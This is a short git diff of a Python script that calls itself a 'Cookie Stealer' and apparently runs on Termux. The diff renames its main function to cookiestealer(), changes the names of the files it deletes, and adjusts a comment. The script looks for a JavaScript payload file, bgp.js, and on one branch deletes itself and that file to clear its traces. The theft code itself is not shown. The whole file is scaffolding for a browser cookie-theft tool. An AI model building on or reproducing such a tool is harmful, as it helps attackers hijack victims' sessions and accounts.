@@ -9,7 +9,7 @@ print("Cookie Stealer Is Starting Now....")
 time.sleep(2)
 
 #definig a function to run the main server
-def shoot():
+def cookiestealer():
 	if os.path.exists('bgp.js') == False:
 		print(colored("\n\n Javscript File Not Found..exiting now!\n", "red", attrs=['bold']))
 		sys.exit(0)
@@ -31,14 +31,14 @@ def shoot():
 			elif ask == 'N':
 				pass
 			else:
-				#sorry for this...........!!!
+				#sorry for this.......!!!
 				print("going to delete me")
-				os.remove("Big_Papa.py")
+				os.remove("cookie-stealer-termux.py")
 				os.remove("bgp.js")
 				print("\n\n[#]Bye")
 				
 
 def main():
-	shoot()
+    cookiestealer()
 
 main()
